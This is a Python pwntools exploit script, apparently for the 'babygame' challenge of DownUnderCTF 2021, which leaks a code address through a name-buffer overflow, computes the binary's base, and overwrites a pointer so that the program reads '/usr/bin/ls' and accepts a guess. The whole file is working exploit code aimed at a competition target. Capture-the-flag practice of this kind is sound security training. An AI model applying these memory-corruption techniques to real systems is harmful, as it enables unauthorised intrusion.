from pwn import *

#r = process('./babygame')
#gdb.attach(r)

r = remote('pwn-2021.duc.tf', 31907)


r.recvuntil(b'Welcome, what is your name?')

r.send(b"a"*30 + b'bb')
r.recvuntil(b'>')
r.sendline(b'2')

stuff = r.recvuntil(b'>').split(b'bb')[1][:6]
stuff = int.from_bytes(stuff, "little")
code_base = stuff - 0x2024

print(hex(code_base))

name_addr = code_base + 0x40a0

payload = b'/usr/bin/ls\x00' 
payload += b"a"*(32 - len(payload))
payload += p64(name_addr)[:6]

r.sendline(b'1')
r.recvuntil(b'What would you like to change your username to?')

r.send(payload)

r.recvuntil(b'>')

r.sendline("1337")
r.recvuntil(b'guess:')

elf = 0x464c457f

r.sendline(str(elf))


r.interactive()